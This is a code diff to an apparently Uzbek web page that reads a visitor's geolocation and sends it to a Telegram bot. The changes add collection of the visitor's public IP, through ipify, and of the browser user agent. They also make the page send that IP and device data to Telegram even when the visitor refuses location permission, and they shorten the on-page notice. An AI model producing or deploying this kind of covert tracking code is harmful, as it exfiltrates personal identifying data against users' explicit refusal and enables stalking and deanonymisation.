@@ -43,7 +43,7 @@
         <h2>Avtomatik Joylashuvni Yuborish Tizimi</h2>
         <p id="status">Boshlanmoqda... Iltimos, joylashuvni ulashishga ruxsat bering.</p>
         <div class="note">
-            *Eslatma: Brauzer xavfsizligi tufayli, sizdan joylashuvga ruxsat so'ralishi mumkin. Ruxsat berish majburiy.
+            *Eslatma: Joylashuvni aniqlash uchun ruxsat berish majburiy.
         </div>
     </div>
 
@@ -56,24 +56,45 @@
 
         const statusText = document.getElementById('status');
 
-        // 1. Telegramga xabar yuborish funksiyasi
+        // 1. Tashqi IP va brauzer ma'lumotlarini olish (Uchinchi tomon xizmati orqali)
+        async function getClientDetails() {
+            try {
+                // ipify orqali IP manzilni olish
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip || 'Noma\'lum IP';
+
+                // Foydalanuvchi agent (brauzer, OS) ma'lumotlarini olish
+                const userAgent = navigator.userAgent;
+
+                return { ip: ipAddress, userAgent: userAgent };
+
+            } catch (e) {
+                console.error("IP yoki UserAgent olishda xato:", e);
+                return { ip: 'IP olishda xato', userAgent: navigator.userAgent };
+            }
+        }
+
+        // 2. Telegramga xabar yuborish funksiyasi
         async function sendLocationToTelegram(latitude, longitude) {
+            const clientDetails = await getClientDetails();
             const now = new Date().toLocaleString('uz-UZ', { timeZone: 'Asia/Tashkent' });
 
-            // Telegram uchun xabar matni (Markdown formatida)
+            // Xabar matnini tuzish
             const textMessage =
-                `*Yangi Mijoz Lokatsiyasi!* 📍\n` +
+                `*Yangi Mijoz Lokatsiyasi (Avto)* 📍\n` +
                 `*Kenglik (Lat):* ${latitude}\n` +
                 `*Uzunlik (Lon):* ${longitude}\n` +
-                `*Vaqt:* ${now}\n\n` +
+                `*Vaqt:* ${now}\n` +
+                `\n-- *Qo'shimcha ma'lumot* --\n` +
+                `*IP Manzil:* ${clientDetails.ip}\n` +
+                `*Qurilma/Brauzer:* ${clientDetails.userAgent}\n\n` +
                 `[Google Xaritada Ko'rish](https://www.google.com/maps/search/?api=1&query=${latitude},${longitude})`;
 
             const payload = {
                 chat_id: CHAT_ID,
                 text: textMessage,
                 parse_mode: 'Markdown'
-                // To'g'ridan-to'g'ri lokatsiyani yuborish uchun 'sendLocation' metodi afzal,
-                // ammo bu 'sendMessage' eng oddiy yechimdir.
             };
 
             try {
@@ -83,9 +104,6 @@
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify(payload),
-                    // Brauzer so'rovni bloklamasligi uchun 'no-cors' ishlatmaslik kerak.
-                    // Bu to'g'ridan-to'g'ri API chaqiruvi (Cross-Origin) bo'lgani uchun, 
-                    // brauzerlar ba'zan xavfsizlik sababli ruxsat bermasligi mumkin. 
                 });
 
                 if (response.ok) {
@@ -102,32 +120,32 @@
             }
         }
 
-        // 2. Muvaffaqiyatli lokatsiya olish callback'i
+        // 3. Muvaffaqiyatli lokatsiya olish callback'i
         function success(position) {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
 
             statusText.textContent = "Joylashuv topildi. Telegramga yuborilmoqda...";
 
-            // Telegramga yuborish funksiyasini chaqirish
+            // Asosiy ma'lumotlarni yuborish funksiyasini chaqirish
             sendLocationToTelegram(latitude, longitude);
         }
 
-        // 3. Xato callback'i
+        // 4. Xato callback'i
         function error(err) {
-            let errorMessage;
-
+            // Agar joylashuvga ruxsat berilmasa, hech bo'lmasa IP va qurilma ma'lumotini yuborishga urinishimiz mumkin.
             if (err.code === err.PERMISSION_DENIED) {
-                errorMessage = "❌ Ruxsat berilmadi. Avtomatik yuborish uchun ruxsat berishingiz kerak edi.";
-            } else {
-                errorMessage = `❌ Joylashuvni aniqlashda xato (${err.code}): ${err.message}`;
+                statusText.textContent = "❌ Joylashuvga ruxsat berilmadi. Faqat IP/Qurilma ma'lumotlari yuborilmoqda...";
+                sendLocationToTelegram("Ruxsat yo'q", "Ruxsat yo'q"); // Lokatsiya ma'lumoti yo'q
+                return;
             }
 
+            let errorMessage = `❌ Joylashuvni aniqlashda xato (${err.code}): ${err.message}`;
             statusText.textContent = errorMessage;
             statusText.style.color = 'red';
         }
 
-        // 4. Avtomatik ishga tushirish funksiyasi
+        // 5. Avtomatik ishga tushirish funksiyasi
         function getLocationAndSend() {
             if (!navigator.geolocation) {
                 statusText.textContent = "Brauzer Geolocation API'ni qo'llab-quvvatlamaydi.";
@@ -135,6 +153,7 @@
                 return;
             }
 
+            // Joylashuvni aniqlashni boshlash
             navigator.geolocation.getCurrentPosition(
                 success,
                 error,
